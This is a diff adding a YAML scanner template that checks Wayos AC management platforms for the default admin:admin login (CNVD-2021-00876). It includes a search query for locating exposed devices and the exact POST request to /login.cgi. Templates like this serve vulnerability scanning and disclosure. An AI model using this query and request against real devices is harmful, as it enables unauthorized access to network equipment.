@@ -1,0 +1,25 @@
+name: Wayos AC集中管理系统默认弱口令  CNVD-2021-00876
+manual: true
+query: title="AC集中管理平台" && body="login_25.jpg"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /login.cgi
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: user=admin&password=admin
+      follow_redirects: true
+    expression: response.status == 200 && !response.body.bcontains(b"flag=0")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: |-
+    深圳维盟科技股份有限公司是国内领先的网络设备及智能家居产品解决方案供应商，主营产品包括无线网关、交换机、国外VPN、双频吸顶ap等。
+
+    AC集中管理平台存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。
+    弱口令  admin:admin
+  tags: 弱口令
